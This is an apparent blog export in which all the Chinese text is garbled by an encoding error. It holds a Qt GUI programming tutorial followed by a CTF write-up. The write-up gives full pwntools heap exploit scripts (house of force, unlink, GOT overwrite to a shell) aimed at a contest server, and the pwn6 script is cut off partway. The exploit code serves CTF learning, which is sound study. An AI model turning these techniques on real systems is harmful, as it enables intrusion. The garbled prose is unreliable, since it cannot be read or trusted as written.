‡å‡†ç±»åå£°æ˜å¤´æ–‡ä»¶æ²¡æœ‰.håç¼€ Qtä¸€ä¸ªç±»å¯¹åº”ä¸€ä¸ªå¤´æ–‡ä»¶ï¼Œç±»åå°±æ˜¯å¤´æ–‡ä»¶å QApplicationåº”ç”¨ç¨‹åºç±» ç®¡ç†å›¾å½¢ç”¨æˆ·ç•Œé¢åº”ç”¨ç¨‹åºçš„æ§åˆ¶æµå’Œä¸»è¦è®¾ç½®ã€‚ æ˜¯Qtçš„æ•´ä¸ªåå°ç®¡ç†çš„å‘½è„‰å®ƒåŒ…å«ä¸»äº‹ä»¶å¾ªç¯**ï¼Œåœ¨å…¶ä¸­æ¥è‡ªçª—å£ç³»ç»Ÿå’Œå…¶å®ƒèµ„æºçš„*æ‰€æœ‰äº‹ä»¶å¤„ç†å’Œè°ƒåº¦ã€‚å®ƒä¹Ÿå¤„ç†åº”ç”¨ç¨‹åºçš„åˆå§‹åŒ–å’Œç»“æŸï¼Œå¹¶ä¸”æä¾›å¯¹è¯ç®¡ç†ã€‚ å¯¹äºä»»ä½•ä¸€ä¸ªä½¿ç”¨Qtçš„å›¾å½¢ç”¨æˆ·ç•Œé¢åº”ç”¨ç¨‹åºï¼Œéƒ½æ­£å¥½å­˜åœ¨ä¸€ä¸ªQApplication å¯¹è±¡ï¼Œè€Œä¸è®ºè¿™ä¸ªåº”ç”¨ç¨‹åºåœ¨åŒä¸€æ—¶é—´å†…æ˜¯ä¸æ˜¯æœ‰0ã€1ã€2æˆ–æ›´å¤šä¸ªçª—å£ã€‚ a.exec() ç¨‹åºè¿›å…¥æ¶ˆæ¯å¾ªç¯ï¼Œç­‰å¾…å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œå“åº”ã€‚è¿™é‡Œmain()æŠŠæ§åˆ¶æƒè½¬äº¤ç»™Qtï¼ŒQtå®Œæˆäº‹ä»¶å¤„ç†å·¥ä½œï¼Œå½“åº”ç”¨ç¨‹åºé€€å‡ºçš„æ—¶å€™exec()çš„å€¼å°±ä¼šè¿”å›ã€‚åœ¨exec()ä¸­ï¼ŒQtæ¥å—å¹¶å¤„ç†ç”¨æˆ·å’Œç³»ç»Ÿçš„äº‹ä»¶å¹¶ä¸”æŠŠå®ƒä»¬ä¼ é€’ç»™é€‚å½“çš„çª—å£éƒ¨ä»¶ã€‚ 4.å¿«æ·é”®åŠå‘½åè§„èŒƒ1234567891011//å‘½åè§„èŒƒ //ç±»å é¦–å­—æ¯å¤§å†™ï¼Œå•è¯å’Œå•è¯ä¹‹é—´é¦–å­—æ¯å¤§å†™//å‡½æ•°å é¦–å­—æ¯å°å†™//ctrl + / æ³¨é‡Š//ctrl + r è¿è¡Œ//ctrl + b ç¼–è¯‘//f1 å¸®åŠ©æ–‡æ¡£//ctrl + shift + ä¸Š ä¸Šç§»//ctrl + i å¯¹é½//f4 åˆ‡æ¢.cpp å’Œ .h 0x02 æ–°å»ºQtç¨‹åº1.QPushButtonåˆ›å»ºæŒ‰é’® æŠŠä¸‹é¢è¿™æ®µä»£ç å¤åˆ¶åˆ°widget.cpp 1234567891011121314151617181920212223242526272829#include&lt;QPushButton&gt;&#123; //æŒ‰é’®æ“ä½œ //åˆ›å»ºç¬¬ä¸€ä¸ªæŒ‰é’® QPushButton * btn = new QPushButton; //showä»¥é¡¶å±‚æ–¹å¼å¼¹å‡ºæ§ä»¶ btn-&gt;show(); //è®¾ç½®çˆ¶äº² btn-&gt;setParent(this); //æ˜¾ç¤ºæ–‡æœ¬ btn-&gt;setText(\"ç¬¬ä¸€ä¸ª\"); //æ­¤å¤–è¿˜æœ‰ç¬¬äºŒç§æ–¹æ³•è¿›è¡Œæ“ä½œ //åˆ›å»ºç¬¬äºŒä¸ªæŒ‰é’® //æŒ‰ç…§æ§ä»¶å¤§å°åˆ›å»ºçª—å£ QPushButton * btn2 = new QPushButton(\"ç¬¬äºŒä¸ª\",this); //ç§»åŠ¨btn2æŒ‰é’® btn2-&gt;move(100,100); //é‡ç½®æŒ‰é’®å¤§å° btn2-&gt;resize(50,50); //çª—å£æ“ä½œ //é‡ç½®çª—å£å¤§å° resize(600,400); //è®¾ç½®å›ºå®šçª—å£å¤§å° //setFixedSize(600,400); //è®¾ç½®çª—å£æ ‡é¢˜ setWindowTitle(\"è®¡ç®—å™¨\");&#125; 2.å¯¹è±¡æ ‘ è‡ªå·±åˆ›å»ºä¸€ä¸ªMyPushButton åŒæ—¶ç»§æ‰¿QPushButton ä»£ç å¦‚ä¸‹ mypushbutton.cpp 1234567891011121314#include \"mypushbutton.h\"#include &lt;QDebug&gt;MyPushButton::MyPushButton(QWidget *parent) : QPushButton(parent)&#123; qDebug() &lt;&lt; \"æŒ‰é’®æ„é€ è°ƒç”¨\";&#125;MyPushButton::~MyPushButton()&#123; qDebug() &lt;&lt; \"æŒ‰é’®æ„é€ ææ„\";&#125; mypushbutton.h 12345678910111213141516#ifndef MYPUSHBUTTON_H#define MYPUSHBUTTON_H#include &lt;QWidget&gt;#include&lt;QPushButton&gt;class MyPushButton : public QPushButton&#123; Q_OBJECTpublic: explicit MyPushButton(QWidget *parent = nullptr); ~MyPushButton();signals:&#125;;#endif // MYPUSHBUTTON_H widget.cpp 123456//åˆ›å»ºè‡ªå·±æŒ‰é’®å¯¹è±¡MyPushButton *btn3 = new MyPushButton;btn3-&gt;show();btn3-&gt;setParent(this);btn3-&gt;setText(\"æˆ‘çš„æŒ‰é’®\");btn3-&gt;move(200,100); å›¾ç¤ºå¦‚ä¸‹ 0x03 ä¿¡å·å’Œæ§½çš„æœºåˆ¶1.ä¿¡å·å’Œæ§½ åŸºæœ¬çš„æ¥å£ 123&#x2F;&#x2F;ç»™æˆ‘çš„æŒ‰é’®ä¸€ä¸ªå…³é—­çª—å£çš„åŠŸèƒ½&#x2F;&#x2F;å‚æ•°1 ä¿¡å·å‘é€è€… å‚æ•°2 å‘é€çš„ä¿¡å·(å‡½æ•°åœ°å€) å‚æ•°3 ä¿¡å·æ¥æ”¶è€… å‚æ•°4 å¤„ç†çš„æ§½å‡½æ•°connect(btn3, &amp;QPushButton::clicked, this, &amp;QWidget::close); è‡ªå®šä¹‰ä¿¡å·å’Œæ§½è‡ªå®šä¹‰ä¿¡å· 123456//ç±»çš„.hæ–‡ä»¶ä¸‹signals: //è‡ªå®šä¹‰ä¿¡å· å†™åœ¨signalsä¸‹ //è¿”å›å€¼æ˜¯void åªéœ€è¦å£°æ˜ ä¸éœ€è¦å®ç° //å¯ä»¥æœ‰å‚æ•°ï¼Œå¯ä»¥é‡è½½ void rang(); è‡ªå®šä¹‰æ§½ 123456789101112//ç±»çš„.æ–‡ä»¶publicä¸­public //è¿”å›å€¼æ˜¯void éœ€è¦å£°æ˜ éœ€è¦å®ç° //å¯ä»¥æœ‰å‚æ•°ï¼Œå¯ä»¥é‡è½½ void recv();//å®ç°åœ¨ç±»çš„.cppä¸­å®ç°void MyPushButton::recv()&#123; qDebug() &lt;&lt; \"æ¥å—æˆåŠŸ\";&#125; æ¥ä¸‹æ¥è¿›è¡Œä¸€ä¸ªå°çš„æ¡ˆä¾‹ ä¸€ä¸ªæŒ‰é’®å“èµ·ä¹‹å ç¨‹åºè¾“å‡ºæ¥å—æˆåŠŸ æˆ‘ä»¬é¦–å…ˆå¾—æœ‰ä¸¤ä¸ªç±» button recv ç„¶åå¾—æœ‰ä¿¡å· æ§½å‡½æ•° å®šä¹‰æ§½å‡½æ•° 12345678910111213//button.hsignals: void rang();//recv.hpublic: void recvsignals();//recv.cppvoid recv::recvsignals()&#123; qDebug() &lt;&lt; \"æ¥å—æˆåŠŸ\";&#125; æœ€åå°±æ˜¯è¿æ¥,è¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„åªæœ‰rangä¹‹åæ‰ä¼šæ¥å— æ‰€ä»¥å°±éœ€è¦rangèµ·æ¥ï¼Œè¿™é‡Œç”¨çš„plzå‡½æ•°è®©å®ƒrang å…¶ä¸­çš„ä¸€äº›æˆå‘˜åéœ€è¦åœ¨widget.hä¸­æ˜¯å®ç° 12345678910111213141516171819202122//widget.hpublic: Widget(QWidget *parent = nullptr); void plz(); ~Widget();private: MyPushButton * btn; recv * recv1;//widget.cpp this-&gt;btn = new MyPushButton(this); this-&gt;recv1 = new recv; btn-&gt;show(); btn-&gt;setParent(this); btn-&gt;setText(\"æˆ‘çš„æŒ‰é’®\"); btn-&gt;move(0,0); connect(btn, &amp;MyPushButton::rang, recv1, &amp;recv::recvsignals); plz();void Widget::plz()&#123; emit btn-&gt;rang();&#125; 2.é‡è½½ä¿¡å·å’Œæ§½æ¥ç€ä¸Šä¸ªæ¡ˆä¾‹ é‡è½½ä¿¡å· é‡è½½æ§½ é‡æ–°å®šä¹‰æ§½å‡½æ•° 12345678910//button.hsignals: void rang(QString);//recv.h void recvsignals(QString s);//recv.pvoid recv::recvsignals(QString second)&#123; qDebug() &lt;&lt; \"æ¥å—æˆåŠŸå“é“ƒ\" &lt;&lt; second &lt;&lt; \"ç§’\";&#125; ç”±äºè¿æ¥æ— æ³•åˆ†æ¸…å‡½æ•°åœ°å€ï¼Œè¿™é‡Œç”¨å‡½æ•°æŒ‡é’ˆæ¥ä½“ç°å‡½æ•°åœ°å€ 123456//ç®€å•è¯´ä¸€ä¸‹å‡½æ•°æŒ‡é’ˆ//è¿”å›ç±»å‹ä¸ºç©º ç¬¬ä¸€ä¸ªæ‹¬å·é‡Œä¸ºæŒ‡é’ˆ ç¬¬äºŒä¸ªæ‹¬å·ä¸ºå‚æ•° =åé¢æ˜¯éœ€è¦æŒ‡å‘å‡½æ•°çš„åœ°å€void(recv:: *recvslot)(QString) = &amp;recv::recvsignals;void(MyPushButton:: *ButtonSignal)(QString) = &amp;MyPushButton::rang;connect(btn, ButtonSignal, recv1, recvslot);plz(); æˆåŠŸå®ç° Qstringæ€ä¹ˆå»æ‰å¼•å· 1&gt;second.toUtf8().data() 3.ä¿¡å·å’Œæ§½çš„æ‹“å±• ä¿¡å·å¯ä»¥è¿æ¥ä¿¡å· ä¸€ä¸ªä¿¡å·å¯ä»¥è¿æ¥å¤šä¸ªæ§½å‡½æ•° å¤šä¸ªä¿¡å·å¯ä»¥è¿æ¥åŒä¸€ä¸ªæ§½å‡½æ•° ä¿¡å·å’Œæ§½å‡½æ•°çš„ç±»å‹å¿…é¡»ä¸€ä¸€å¯¹åº” ä¿¡å·çš„å‚æ•°ä¸ªæ•°å¯ä»¥å¤§äºæ§½å‡½æ•°çš„å‚æ•°ä¸ªæ•° ä¿¡å·è¿æ¥ä¿¡å·ç»§ç»­ä¸‹ä¸€ä¸ª æˆ‘ä»¬æŒ‰ä¸‹æŒ‰é’®1æ‰ä¼šå“é“ƒ è¿™é‡Œç”¨ä¸¤ç§å®ç° ç‚¹å‡»è¿æ¥plzå‡½æ•° ç‚¹å‡»è¿æ¥å“é“ƒä¿¡å·,æ­¤æ—¶å‡½æ•°ä¸­æ— å‚æ•° 12345678//widget.cpp QPushButton *btn1 = new QPushButton(\"å“é“ƒ\",this); btn1-&gt;move(0,0); connect(btn1,&amp;QPushButton::clicked,this,&amp;Widget::plz);//widget.cpp QPushButton *btn1 = new QPushButton(\"å“é“ƒ\",this); btn1-&gt;move(0,0); connect(btn1,&amp;QPushButton::clicked,btn,ButtonSignal); æ•ˆæœå›¾å¦‚ä¸‹ æ–¹æ³•1 æ–¹æ³•2 4.Lambdaè¡¨è¾¾å¼123456789101112131415[=]()&#123; btn1-&gt;setText(\"ç¬¬äºŒä¸ª\");&#125;(); //()è°ƒç”¨//[]å¿…é¡»å­˜åœ¨ ä¸å¯çœç•¥//()é‡è½½å‡½æ•°çš„å‚æ•°//= å€¼ä¼ é€’//&amp; å¼•ç”¨ä¼ é€’//a åªå¯¹aä¼ é€’//&amp;a åªå¯¹å¼•ç”¨aä¼ é€’//å¯¹äºæƒ³è¦å€¼ä¿®æ”¹ï¼Œéœ€è¦mutableå…³é”®å­—,ä½†ä¸æ”¹å˜æœ¬ä½“[=]()mutable&#123;m = 100 + 10; qDebug &lt;&lt; m;&#125;();//è¿”å›å€¼ -&gt;è¿”å›å€¼ç±»å‹int ret = []()-&gt;int&#123;return 1000;&#125;(); 0x04 QMainWindow 1.èœå•æ 123456789101112131415//èœå•æ //èœå•æ æœ€å¤šæœ‰ä¸€ä¸ª//åˆ›å»ºèœå•æ QMenuBar * bar = menuBar();//å°†èœå•æ æ”¾å…¥åˆ°çª—å£ä¸­setMenuBar(bar);//åˆ›å»ºèœå•QMenu * fileMenu = bar-&gt;addMenu(\"æ–‡ä»¶\");QMenu * editMenu = bar-&gt;addMenu(\"ç¼–è¾‘\");//åˆ›å»ºèœå•é¡¹//fileMenu-&gt;addAction(\"æ–°å»º\");QAction * action1 = fileMenu-&gt;addAction(\"æ–°å»º\");//æ·»åŠ åˆ†éš”ç¬¦fileMenu-&gt;addSeparator();QAction * action2 = fileMenu-&gt;addAction(\"æ‰“å¼€\"); 2.å·¥å…·æ 1234567891011121314151617181920//å·¥å…·æ //å·¥å…·æ  å¯ä»¥æœ‰å¤šä¸ªQToolBar * toolBar = new QToolBar(this);//å·¥å…·æ åŒºåŸŸaddToolBar(Qt::LeftToolBarArea,toolBar);//è®¾ç½®å·¥å…·æ åŒºåŸŸ åªå…è®¸å·¦å³åœé toolBar-&gt;setAllowedAreas(Qt::LeftToolBarArea|Qt::RightToolBarArea);//è®¾ç½®æµ®åŠ¨toolBar-&gt;setFloatable(false);//è®¾ç½®ç§»åŠ¨toolBar-&gt;setMovable(false);//è®¾ç½®å†…å®¹//toolBar-&gt;addAction(\"æ–°å»º\");toolBar-&gt;addAction(action1);//æ·»åŠ åˆ†å‰²çº¿toolBar-&gt;addSeparator();toolBar-&gt;addAction(action2);//å·¥å…·æ æ·»åŠ æ§ä»¶QPushButton *btn = new QPushButton(\"ç‚¹è¿™é‡Œ\",this);toolBar-&gt;addWidget(btn); 3.çŠ¶æ€æ 123456789101112//çŠ¶æ€æ //çŠ¶æ€æ å¯ä»¥æœ‰å¤šä¸ªQStatusBar * stBar = statusBar();//è®¾ç½®åˆ°çª—å£setStatusBar(stBar);//æ·»åŠ æ ‡ç­¾æ§ä»¶//å·¦ä¾§æç¤ºQLabel * label = new QLabel(\"å·¦ä¾§ä¿¡æ¯\",this);stBar-&gt;addWidget(label);//å³ä¾§æç¤ºQLabel * label1 = new QLabel(\"å³ä¾§ä¿¡æ¯\",this);stBar-&gt;addPermanentWidget(label1); 4.æµ®åŠ¨çª—å£123456//é“†æ¥éƒ¨ä»¶(æµ®åŠ¨çª—å£)//é“†æ¥éƒ¨ä»¶ å¯ä»¥æœ‰å¤šä¸ªQDockWidget * dock = new QDockWidget(\"æµ®åŠ¨\",this);addDockWidget(Qt::BottomDockWidgetArea,dock);//è®¾ç½®åœé åŒºåŸŸdock-&gt;setAllowedAreas(Qt::BottomDockWidgetArea); 5.æ ¸å¿ƒéƒ¨ä»¶123//è®¾ç½®ä¸­å¿ƒéƒ¨ä»¶(åªèƒ½æœ‰ä¸€ä¸ª)QTextEdit * edit = new QTextEdit(this);setCentralWidget(edit); 0x05 èµ„æºæ–‡ä»¶ 0x06 å¯¹è¯æ¡†1.åŸºæœ¬æ¦‚å¿µ1234567891011121314151617181920//æ–°å»ºæŒ‰é’® å¼¹å‡ºå¯¹è¯æ¡† connect(ui-&gt;actionnew,&amp;QAction::triggered,[=]()&#123; //æ¨¡æ€å¯¹è¯æ¡† ï¼ˆä¸å¯ä»¥å¯¹å…¶å®ƒçª—å£è¿›è¡Œæ“ä½œï¼‰ //éæ¨¡æ€å¯¹è¯æ¡† ï¼ˆå¯ä»¥å¯¹å…¶ä»–çª—å£è¿›è¡Œæ“ä½œï¼‰ //æ¨¡æ€å¯¹è¯æ¡†çš„åˆ›å»º QDialog dlg(this); //å¯¹è¯æ¡†çš„å¤§å° dlg.resize(200,100); //å¯¹è¯æ¡†é˜»å¡ dlg.exec(); //éæ¨¡æ€å¯¹è¯æ¡† QDialog *dlg2 = new QDialog(this); dlg2-&gt;resize(200,100); dlg2-&gt;show(); //å…³é—­é‡Šæ”¾å†…å­˜ dlg2-&gt;setAttribute(Qt::WA_DeleteOnClose); &#125;); 2.æ ‡å‡†å¯¹è¯æ¡†12345678910111213//æ¶ˆæ¯å¯¹è¯æ¡†//é”™è¯¯å¯¹è¯æ¡†//QMessageBox::critical(this,\"é”™è¯¯\",\"é”™è¯¯\");//ä¿¡æ¯å¯¹è¯æ¡†//QMessageBox::information(this,\"æ¶ˆæ¯\",\"æ¶ˆæ¯\");//æé—®å¯¹è¯æ¡†//å‚æ•°1 çˆ¶äº² å‚æ•°2 æ ‡é¢˜ å‚æ•°3 æç¤ºå†…å®¹ å‚æ•°4 æŒ‰é”®ç±»å‹QMessageBox::question(this,\"æé—®\",\"æé—®\",QMessageBox::Save|QMessageBox::Cancel);if(QMessageBox::Save==QMessageBox::question(this,\"æé—®\",\"æé—®\",QMessageBox::Save|QMessageBox::Cancel))&#123; qDebug() &lt;&lt; \"ä¿å­˜\";&#125; 3.å…¶ä»–å¯¹è¯æ¡†12345678//é¢œè‰²å¯¹è¯æ¡†//QColor color = QColorDialog::getColor(QColor(255,0,0));//æ–‡ä»¶å¯¹è¯æ¡†//å‚æ•°1 çˆ¶äº² å‚æ•°2 æ ‡é¢˜ å‚æ•°3 ç›®å½• å‚æ•°4 æ–‡ä»¶æ ¼å¼//QString str = QFileDialog::getOpenFileName(this,\"æ‰“å¼€\",\"c://\",\"(*.txt)\");//å­—ä½“å¯¹è¯æ¡†bool flag;QFontDialog::getFont(&amp;flag,QFont(\"åæ–‡å½©äº‘\",36)); 0x07 ç•Œé¢å¸ƒå±€ 0x08 æ§ä»¶1.æŒ‰é’® 2.æ ‘æ§ä»¶12345678910//æ ‘æ§ä»¶çš„ä½¿ç”¨//æ°´å¹³å¤´ui-&gt;treeWidget-&gt;setHeaderLabels(QStringList()&lt;&lt; \"è‹±é›„\" &lt;&lt; \"è‹±é›„ä»‹ç»\");//åŠ è½½é¡¶å±‚çš„èŠ‚ç‚¹QTreeWidgetItem * liitem = new QTreeWidgetItem(QStringList()&lt;&lt;\"åŠ›é‡\");QTreeWidgetItem * spitem = new QTreeWidgetItem(QStringList()&lt;&lt;\"é€Ÿåº¦\");QTreeWidgetItem * faitem = new QTreeWidgetItem(QStringList()&lt;&lt;\"æ³•åŠ›\");ui-&gt;treeWidget-&gt;addTopLevelItem(liitem);ui-&gt;treeWidget-&gt;addTopLevelItem(spitem);ui-&gt;treeWidget-&gt;addTopLevelItem(faitem); 3.tableæ§ä»¶1234567891011121314//tableæ§ä»¶ //è®¾ç½®åˆ—æ•° ui-&gt;tableWidget-&gt;setColumnCount(3); //è®¾ç½®æ°´å¹³è¡¨å¤´ ui-&gt;tableWidget-&gt;setHorizontalHeaderLabels(QStringList()&lt;&lt;\"å§“å\" &lt;&lt;\"æ€§åˆ«\" &lt;&lt; \"å¹´é¾„\"); //è®¾ç½®è¡Œæ•° ui-&gt;tableWidget-&gt;setRowCount(5); //è®¾ç½®æ­£æ–‡ ui-&gt;tableWidget-&gt;setItem(0,0,new QTableWidgetItem(\"å‹ç¼©\")); //åˆ—è¡¨ QList&lt;QString&gt; namelist; QStringList sexlist; sexlist &lt;&lt; \"ç”·\" &lt;&lt; \"ç”·\" &lt;&lt; \"ç”·\" &lt;&lt; \"ç”·\"ï¼› namelist &lt;&lt; \"ll\" &lt;&lt; \"aa\" &lt;&lt; \"11\"; 4.å…¶ä»–æ§ä»¶éœ€è¦çš„æ—¶å»çœ‹åº“å§ 0x09 Qfileæ–‡ä»¶è¯»å†™","categories":[{"name":"Qt","slug":"Qt","permalink":"https://pz1o.top/categories/Qt/"}],"tags":[{"name":"Qt","slug":"Qt","permalink":"https://pz1o.top/tags/Qt/"},{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://pz1o.top/tags/%E5%AE%9E%E9%AA%8C/"}]},{"title":"æ–°ç”Ÿèµ›å¤ç°","slug":"æ–°ç”Ÿèµ›å¤ç°","date":"2020-12-06T14:22:34.000Z","updated":"2020-12-23T09:07:46.902Z","comments":true,"path":"2020/12/06/æ–°ç”Ÿèµ›å¤ç°/","link":"","permalink":"https://pz1o.top/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"å¤ç°ç»ˆäºè€ƒå®Œè¯•äº†ï¼Œè¿™è€ƒå‰å­¦çœŸä¸æ˜¯äººå¹²çš„ï¼Œä¸Šè¯¾è¿˜æ˜¯å¾—å¬ä¸€å¬ å¤ç°ä¸€ä¸‹è¿™å‡ é“é¢˜ï¼Œé¡ºä¾¿å­¦ä¹ å †çš„çŸ¥è¯† æ·¦ æˆ‘æ˜¯fw æ‹–äº†äº”å¤© ç»ˆäºæ¥å¤ç°äº† ä½†å‘ç°å †å·²ç»å¿˜å¾—å·®ä¸å¤šäº† å…ˆå¤ä¹ å †çš„åŸºç¡€çŸ¥è¯† https://blog.csdn.net/qq_41453285/category_9150569.htmlï¼ˆæµ…æ˜¾æ˜“æ‡‚ï¼Œéå¸¸é€‚åˆæ–°æ‰‹å­¦ï¼‰ https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_overview-zh/ pwn5å®˜æ–¹wp åˆ©ç”¨changeå‡½æ•°ä¸­å­˜åœ¨çš„ä»»æ„å­—èŠ‚å †æº¢å‡ºæ„é€ house of forceæ”»å‡» å…³äºhouse of forceä¸æ‡‚å¾—çš„å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç«  https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/ å…ˆæ¥çœ‹ä¸€ä¸‹house of force house of forceåˆ©ç”¨æ¡ä»¶ èƒ½å¤Ÿä»¥æº¢å‡ºç­‰æ–¹å¼æ§åˆ¶åˆ° top chunk çš„ size åŸŸ èƒ½å¤Ÿè‡ªç”±åœ°æ§åˆ¶å †åˆ†é…å°ºå¯¸çš„å¤§å° åˆ©ç”¨æ­¥éª¤ (1)é¦–å…ˆå…ˆæ³„éœ²å‡ºå †åœ°å€ã€‚ (2)åˆ©ç”¨å †æº¢å‡ºï¼Œå°†top chunkçš„sizeåŸŸä¿®æ”¹ä¸ºå¾ˆå¤§çš„æ•° (3)ç”³è¯·å¤§å—å†…å­˜(å¯ä»¥é€šè¿‡å †åœ°å€å’Œç›®æ ‡åœ°å€çš„è·ç¦»è¿›è¡Œè®¡ç®—)ï¼Œä½¿å¾—top chunkçš„å¤´éƒ¨è½åœ¨ç›®æ ‡åœ°å€èŒƒå›´å†…ã€‚ (4)å†æ¬¡ç”³è¯·å†…å­˜ï¼Œé‚£ä¹ˆæ–°ç”³è¯·çš„å†…å­˜å³ä¸ºç›®æ ‡åœ°å€ï¼Œé€šå¸¸æƒ…å†µä¸‹(æœªå¼€å¯FullRelro)ï¼Œä¸€èˆ¬æ˜¯å°†ç›®æ ‡åœ°å€è®¾ä¸ºgotè¡¨åœ°å€ã€‚ House Of Force äº§ç”Ÿçš„åŸå› åœ¨äº glibc å¯¹ top chunk çš„å¤„ç†ï¼Œæ ¹æ®å‰é¢å †æ•°æ®ç»“æ„éƒ¨åˆ†çš„çŸ¥è¯†æˆ‘ä»¬å¾—çŸ¥ï¼Œè¿›è¡Œå †åˆ†é…æ—¶ï¼Œå¦‚æœæ‰€æœ‰ç©ºé—²çš„å—éƒ½æ— æ³•æ»¡è¶³éœ€æ±‚ï¼Œé‚£ä¹ˆå°±ä¼šä» top chunk ä¸­åˆ†å‰²å‡ºç›¸åº”çš„å¤§å°ä½œä¸ºå †å—çš„ç©ºé—´ã€‚ é‚£ä¹ˆï¼Œå½“ä½¿ç”¨ top chunk åˆ†é…å †å—çš„ size å€¼æ˜¯ç”±ç”¨æˆ·æ§åˆ¶çš„ä»»æ„å€¼æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿç­”æ¡ˆæ˜¯ï¼Œå¯ä»¥ä½¿å¾— top chunk æŒ‡å‘æˆ‘ä»¬æœŸæœ›çš„ä»»ä½•ä½ç½®ï¼Œè¿™å°±ç›¸å½“äºä¸€æ¬¡ä»»æ„åœ°å€å†™ã€‚ å› ä¸ºæ˜¯ç¬¬ä¸€æ¬¡å¼„å †é¢˜ æ‰€ä»¥å°½é‡å¼„å¾—æ¸…æ¥šä¸€ç‚¹ è¿˜æœªè¿›å…¥èœå• å †ä¸­æƒ…å†µ ä¸¤ä¸ªæŒ‡é’ˆ æ·»åŠ ä¸€ä¸ª 1add(0x30, \"aaaa\") ä¿®æ”¹top chunkå¤§å° 123payload = 0x30 * 'a'payload += p64(0) + p64(0xffffffffffffffff)change(0,0x41,payload) è¿™æ—¶ æˆ‘ä»¬éœ€è¦æŠŠtopæŒ‡é’ˆæŒ‡å‘å †åº•ï¼Œä»è€Œæ”¹å˜å‡½æ•°æŒ‡é’ˆ é‚£æˆ‘ä»¬åº”è¯¥æ€ä¹ˆç”³è¯·å¤§å°å‘¢ï¼Œæˆ‘ä»¬éœ€è¦â€œåæ’¤æ­¥â€ï¼Œå°±æ˜¯è´Ÿå‘ç”³è¯·åœ°å€ã€‚é‚£å¤§å°å‘¢ï¼Œæœ€èµ·ç åº”è¯¥æ˜¯0x40+0x20ï¼Œç„¶ååŠ ä¸Šä¸€ä¸ªå¤´éœ€è¦çš„åœ°å€ï¼ˆ0xfï¼‰ä¸å°¾éƒ¨topå‰å¯ç”¨çš„ç©ºé—´ï¼ˆ0x8ï¼‰ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *r = remote(\"219.219.61.234\",10014)def add(size,name): r.recvuntil(\":\") r.sendline(\"2\") r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(name)def change(idx,size,name): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\":\") r.sendline(str(idx)) r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(name)def delete(idx): r.recvuntil(\":\") r.sendline(\"4\") r.recvuntil(\":\") r.sendline(str(idx))def show(): r.recvuntil(\":\") r.sendline(\"1\")magic = 0x400D1Badd(0x30, \"ddaa\")payload = 0x30 * 'a'payload += p64(0) + p64(0xffffffffffffffff)change(0,0x41,payload)offset_to_heap_base = -(0x40 + 0x20)malloc = offset_to_heap_base - 0x8 - 0xfadd(malloc,\"dddd\")add(0x10,p64(magic) * 2)r.recvuntil(\":\")r.sendline(\"5\")print(r.recv())r.interactive() è´Ÿå‘ç”³è¯·ç„¶åæ‰“è¿‡å»ï¼Œç„¶åè¿™é‡Œåº”è¯¥å¯ä»¥åªè¦ç”³è¯·è¶³å¤Ÿå¤§ ç„¶åæŠŠé‡Œé¢å†…å®¹å…¨è¦†ç›–ä¸ºåé—¨å‡½æ•° ç›´æ¥è°ƒç”¨åº”è¯¥éƒ½å¯ä»¥ unlinkå¯ä»¥å»çœ‹æˆ‘åˆšæ€»ç»“çš„å † 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#!/usr/bin/python#coding=utf-8from pwn import *#context.log_level = 'debug'p = process('./pwn5')#p = remote('219.219.61.234','10014')elf = ELF('./pwn5')libc = elf.libcdef add(size,con): p.sendlineafter('Your choice:','2') p.sendlineafter('Plz input the size of item name:',str(size)) p.sendafter('Plz input the name:',con)def delete(idx): p.sendlineafter('Your choice:','4') p.sendlineafter('Plz enter the index of item:',str(idx))def show(): p.sendlineafter('Your choice:','1')def change(idx,size,con): p.sendlineafter('Your choice:','3') p.sendlineafter('Plz enter the index of item:',str(idx)) p.sendlineafter('Plz enter the length of item name:',str(size)) p.sendafter('Plz enter the new name of the item:',con)buf = 0x06020b8sys = 0x400D1Badd(0x60,'ccc')add(0x58,'aaa')add(0x80,'bbb')add(0x60,'eee')add(0x60,'fff')payload = p64(0)+p64(0x51)payload += p64(buf - 0x18) payload += p64(buf - 0x10)payload += 'a'*0x30payload += p64(0x50)+p8(0x90) change(1,0x80,payload)delete(2)change(1,0x40,p64(0x60)*3+ p64(0x6020a8))change(1,0x40,p64(elf.got['free']))change(0,0x40,p64(sys)*2)# delete(3)# gdb.attach(p)p.interactive() pwn6 changeå‡½æ•°ä¸­å­˜åœ¨å•å­—èŠ‚æº¢å‡ºæ¼æ´ 12345&gt;if ( heap[v1] ) &gt;&#123; printf(&quot;Content of heap : &quot;); read_input(heap[v1][1], *heap[v1] + 1LL); puts(&quot;Done !&quot;); &gt;&#125; åˆ©ç”¨å•å­—èŠ‚æº¢å‡ºæ¼æ´æ„é€ fake_chunk,freeä¹‹åå†æ¬¡åˆ†é…é€ æˆoverlap,ä»è€Œä»»æ„åœ°å€è¯»å†™ æ³„éœ²å‡ºlibcåŸºåœ°å€ï¼Œä¿®æ”¹gotè¡¨ï¼Œæœ€åget_shell æ¯•ç«Ÿä¸€å¼€å§‹åšå †é¢˜ï¼Œä¸Šæ¥å…ˆåˆ†æï¼Œå°½é‡è¯¦ç»†ç‚¹ addå‡½æ•° å…¶ä¸­æ•°æ®ç»“æ„ä¸º changeå‡½æ•° ç›´æ¥çœ‹expåˆ†æå§ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *r = remote(\"219.219.61.234\",10015)heap = ELF('./pwn6')libc = ELF('./libc.so.6')context.log_level = 'debug'def add(size,content): r.recvuntil(\":\") r.sendline(\"1\") r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(content)def change(idx,content): r.recvuntil(\":\") r.sendline(\"2\") r.recvuntil(\":\") r.sendline(str(idx)) r.recvuntil(\":\") r.sendline(content) #r.recvuntil(\":\") #r.sendline(name)def delete(idx): 